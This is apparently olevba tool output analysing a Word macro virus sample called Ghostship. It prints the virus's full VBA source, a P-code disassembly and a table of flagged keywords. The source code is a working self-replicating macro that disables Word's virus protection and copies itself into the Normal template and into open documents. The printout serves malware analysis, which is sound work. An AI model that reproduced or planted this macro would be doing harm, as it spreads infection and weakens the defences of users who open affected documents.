olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ghostship.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ghostship.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Document_Open()
Options.VirusProtection = False
NormalTemplate.VBProject.VBComponents(1).Export ("C:\Norm.bas")
ActiveDocument.VBProject.VBComponents(1).Export ("C:\Virus.bas")
Open "C:\Norm.bas" For Input As #9
On Error Resume Next

If LOF(9) < 600 Then
    Open "C:\Virus.bas" For Input As #1
    ElseIf LOF(1) < 600 Then
    Open "C:\Norm.bas" For Input As #1
    Else
    Close #1, #9
    GoTo NowISeeYou
End If

Do Until Chars = "Private Sub Document_Open()"
    Line Input #1, Chars
Loop

Do
    Line Input #1, Chars
    VirCode = VirCode & Chars & Chr(13)
Loop Until Chars = "WrittenBy = LordArz"

If LOF(9) < 600 Then
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 9, VirCode
    NormalTemplate.Save
    Else
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.InsertLines 9, VirCode
    ActiveDocument.Save
End If
Close #1, #9
Kill "C:\Virus.bas"
NowISeeYou:
Kill " C:\Norm.bas"
Randomize Timer
If Int(Rnd * 10) < 5 Then
'SetAttr "C:\Recycled", vbNormal
'RmDir "C:\Recycled"
End If
VirusName = GhostShip
WrittenBy = LordArz
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ghostship.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8068 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	LitVarSpecial (False)
' 	Ld VirusProtection 
' 	MemSt Save 
' Line #4:
' 	LitStr 0x000B "C:\Norm.bas"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #5:
' 	LitStr 0x000C "C:\Virus.bas"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #6:
' 	LitStr 0x000B "C:\Norm.bas"
' 	LitDI2 0x0009 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' Line #9:
' 	LitDI2 0x0009 
' 	ArgsLd VirusName 0x0001 
' 	LitDI2 0x0258 
' 	Lt 
' 	IfBlock 
' Line #10:
' 	LitStr 0x000C "C:\Virus.bas"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #11:
' 	LitDI2 0x0001 
' 	ArgsLd VirusName 0x0001 
' 	LitDI2 0x0258 
' 	Lt 
' 	ElseIfBlock 
' Line #12:
' 	LitStr 0x000B "C:\Norm.bas"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #13:
' 	ElseBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0002 
' Line #15:
' 	GoTo Sections 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Ld Chars 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Eq 
' 	DoUnitil 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld Chars 
' 	LineInput 
' Line #20:
' 	Loop 
' Line #21:
' Line #22:
' 	Do 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld Chars 
' 	LineInput 
' Line #24:
' 	Ld VirCode 
' 	Ld Chars 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VirCode 
' Line #25:
' 	Ld Chars 
' 	LitStr 0x0013 "WrittenBy = LordArz"
' 	Eq 
' 	LoopUntil 
' Line #26:
' Line #27:
' 	LitDI2 0x0009 
' 	ArgsLd VirusName 0x0001 
' 	LitDI2 0x0258 
' 	Lt 
' 	IfBlock 
' Line #28:
' 	LitDI2 0x0009 
' 	Ld VirCode 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	Ld NormalTemplate 
' 	ArgsMemCall _B_var_GhostShip 0x0000 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	LitDI2 0x0009 
' 	Ld VirCode 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld ActiveDocument 
' 	ArgsMemCall _B_var_GhostShip 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0002 
' Line #35:
' 	LitStr 0x000C "C:\Virus.bas"
' 	ArgsCall Kill 0x0001 
' Line #36:
' 	Label Sections 
' Line #37:
' 	LitStr 0x000C " C:\Norm.bas"
' 	ArgsCall Kill 0x0001 
' Line #38:
' 	Ld Rnd 
' 	ArgsCall Read 0x0001 
' Line #39:
' 	Ld SetAttr 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #40:
' 	QuoteRem 0x0000 0x001F "SetAttr "C:\Recycled", vbNormal"
' Line #41:
' 	QuoteRem 0x0000 0x0013 "RmDir "C:\Recycled""
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld Options 
' 	St _B_var_VirusName 
' Line #44:
' 	Ld LordArz 
' 	St WrittenBy 
' Line #45:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

